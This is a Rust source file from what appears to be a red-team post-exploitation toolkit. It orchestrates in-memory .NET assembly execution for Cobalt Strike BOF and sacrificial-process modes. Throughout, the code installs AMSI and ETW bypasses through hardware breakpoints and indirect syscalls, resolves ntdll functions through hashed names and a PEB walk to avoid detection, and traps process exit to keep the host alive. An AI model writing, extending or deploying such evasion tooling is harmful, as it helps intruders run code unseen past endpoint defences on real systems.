//! Shared CLR-hosting orchestrator used by both `senjata-execute-assembly`
//! (BOF, inline mode) and `senjata-runner` (postex DLL, sacrificial mode).
#![no_std]

extern crate alloc;


#[cfg(target_os = "windows")]
pub mod error;
#[cfg(target_os = "windows")]
pub use error::OrchestratorError;

pub mod pe_parser;

#[cfg(target_os = "windows")]
pub mod io;
#[cfg(target_os = "windows")]
pub mod cleanup;
#[cfg(target_os = "windows")]
pub mod dispatch;
#[cfg(target_os = "windows")]
pub mod netfx;
#[cfg(target_os = "windows")]
pub mod coreclr;
#[cfg(target_os = "windows")]
pub mod flush;
#[cfg(target_os = "windows")]
pub mod bypasses;

/// Parsed-args bag passed to `orchestrate`. Both the BOF (inline mode)
/// and the postex DLL (sacrificial mode) parse their wire-format args
/// into this struct after parsing. Borrows live for the duration of the
/// `orchestrate` call — the underlying arg blob must outlive the call.
#[cfg(target_os = "windows")]
pub struct OrchestrateInput<'a> {
    pub app_domain: &'a str,
    pub amsi: bool,
    pub etw: bool,
    pub mailslot: bool,
    pub entry_point: u32,
    pub slot_name: &'a str,
    pub pipe_name: &'a str,
    pub asm_args: &'a str,
    pub mode: u32,
    pub main_name: &'a str,
    pub asm_bytes: &'a [u8],
}

/// End-to-end CLR-host runner. Used by the BOF (inline mode) and the
/// postex DLL (sacrificial mode).
///
/// # Safety
///
/// Caller must guarantee:
/// - PEB walker (`opsec_peb`) is in a valid state. No explicit init is
///   required; PEB is process-global.
/// - `engine: &HwbpEngine` is freshly initialized via `HwbpEngine::init()`
///   on the calling thread and stays alive for the duration of the call.
///   The engine installs HWBP descriptors on threads as needed; do not
///   share one engine across BOF/runner instances.
/// - `input.asm_bytes` outlives the call and is a valid managed PE (single-
///   file mode) or a valid multi-file blob (mode == 1; see
///   `netfx::parse_multi_blob` for the layout).
/// - Single-threaded entry. The orchestrator installs and removes HWBP
///   descriptors via indirect syscalls; concurrent entry from another
///   thread of the same process would race on the engine state.
/// - The host process can tolerate `Console.Out` redirection — for the
///   BOF this means Beacon's process, for the postex DLL it's a fresh
///   sacrificial.
///
/// On `Environment.Exit` inside the managed code, the exit-trap rewrites
/// RIP/RSP back to the cleanup point captured before dispatch; the
/// function then drains any remaining output and returns `Ok(())`.
#[cfg(target_os = "windows")]
pub unsafe fn orchestrate(
    input: &OrchestrateInput<'_>,
    engine: &opsec_hwbp::HwbpEngine,
) -> Result<(), OrchestratorError> {
    unsafe {
        // PE parser → runtime detection (single-file mode only; multi-file
        // mode trusts the caller-bundled blob).
        let asm_info = if input.mode == 1 {
            pe_parser::AsmInfo { runtime: pe_parser::Runtime::NetFx4 }
        } else {
            pe_parser::parse(input.asm_bytes).map_err(|e| match e {
                pe_parser::Error::MixedMode => OrchestratorError::MixedModeUnsupported,
                pe_parser::Error::ArchMismatch => OrchestratorError::ArchMismatch,
                other => OrchestratorError::PeParse(other),
            })?
        };

        // Install ETW / AMSI / AllocConsole HWBP bypasses.
        let _bypasses = bypasses::install(engine, input.amsi, input.etw)?;

        // Open the output channel BEFORE the CLR initializes stdio.
        let mut io_ch = io::IoChannel::open(input.mailslot, input.slot_name, input.pipe_name)?;

        // Capture the cleanup point for the exit-trap (re-entry after
        // Environment.Exit). The trap is installed below before dispatch.
        let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
        // Two paths land here:
        //   A. First entry: dispatch the assembly, then drain.
        //   B. Re-entry from RtlExitUserProcess exit-trap: dispatch_result?
        //      unwound via the cleanup-RIP/RSP rewrite; we resume here for
        //      a final drain.
        // Path A executes the dispatch block; path B falls through to the
        // trailing drain.
        {
            // Install the exit-trap on RtlExitUserProcess (slot 2).
            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exit_h = opsec_strcrypt::hash!("RtlExitUserProcess");
            let exit_target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exit_h))
                .ok_or(OrchestratorError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exit_h,
                })?;
            let _exit_trap = engine
                .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                .map_err(OrchestratorError::Hwbp)?;

            let dispatch_result = dispatch::dispatch(
                &asm_info,
                input.asm_bytes,
                input.app_domain,
                input.asm_args,
                input.entry_point,
                input.mode,
                input.main_name,
                io_ch.write_handle() as usize,
            );

            // Path A: assembly Main returned normally.
            #[cfg(feature = "debug-io")]
            io_ch.diag_write(b"\n[RUST_END]\n");
            if let Ok(output) = io_ch.drain() {
                if !output.is_empty() {
                    rustbof::eprintln!("\n{}", output);
                }
            }
            dispatch_result?;
        }
        // Trailing drain — covers path B (no-op for path A, which already
        // drained).
        if let Ok(output) = io_ch.drain() {
            if !output.is_empty() {
                rustbof::eprintln!("\n{}", output);
            }
        }
        Ok(())
    }
}
